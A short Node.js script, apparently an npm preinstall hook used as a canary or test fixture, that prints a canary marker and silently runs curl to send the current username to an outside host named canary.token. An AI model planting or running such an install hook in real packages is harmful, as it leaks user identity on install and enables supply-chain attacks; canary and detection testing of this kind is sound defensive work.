#!/usr/bin/env node
console.log('CANARY_NPM_PREINSTALL_EXECUTED');
const { execSync } = require('child_process');
try {
  execSync('curl -s http://canary.token/$(whoami) || true', { stdio: 'inherit' });
} catch(e) {}
process.exit(0);